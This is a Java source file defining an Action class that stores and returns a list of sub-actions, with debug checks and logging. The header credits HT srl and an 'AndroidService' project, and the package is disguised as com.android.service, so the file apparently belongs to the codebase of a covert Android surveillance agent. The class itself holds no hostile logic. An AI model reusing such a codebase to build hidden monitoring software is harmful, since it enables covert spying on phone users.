/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service.action;

import java.util.ArrayList;
import java.util.List;

import android.util.Log;

import com.android.service.GeneralException;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

/**
 * The Class Action.
 */
public class Action {
	private static final String TAG = "Action";
	
	/** The Constant ACTION_NULL. */
	public static final int ACTION_NULL = -1;

	/** Action array. */
	private final List<SubAction> list;

	/** Action ID. */
	private final int actionId;

	/**
	 * Action constructor.
	 * 
	 * @param id
	 *            : action id
	 * @param num
	 *            : number of subactions
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public Action(final int id) {
		if(Cfg.DEBUG) Check.asserts(id >= 0, "Invalid id");

		this.actionId = id;
		list = new ArrayList<SubAction>();
	}

	/**
	 * Gets the id.
	 * 
	 * @return the id
	 */
	public int getId() {
		return this.actionId;
	}

	/**
	 * Gets the sub actions num.
	 * 
	 * @return the sub actions num
	 */
	public int getSubActionsNum() {
		return list.size();
	}

	/**
	 * Adds the sub action.
	 * 
	 * @param type
	 *            the type
	 * @param params
	 *            the params
	 * @throws GeneralException
	 *             the RCS exception
	 */
	public boolean addSubAction(final int typeId, final byte[] params) throws GeneralException {
		SubActionType type = SubActionType.get(typeId);
		if (type != null) {
			final SubAction sub = SubAction.factory(type, params);
			list.add(sub);
			return true;
		}else{
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error (addSubAction): unknown type Id = " + typeId);
			return false;
		}
	}

	/**
	 * Mainly for test purposes
	 * 
	 * @param sub
	 */
	public void addSubAction(SubAction sub) {
		list.add(sub);
	}

	/**
	 * Gets the sub action.
	 * 
	 * @param index
	 *            the index
	 * @return the sub action
	 * @throws GeneralException
	 *             the rCS exception
	 */
	public SubAction getSubAction(final int index) throws GeneralException {
		if (index < 0 || index >= list.size()) {
			throw new GeneralException("Subaction index above SubAction array boundary");
		}

		return list.get(index);
	}

	public SubAction[] getSubActions() {
		return list.toArray(new SubAction[] {});
	}
}
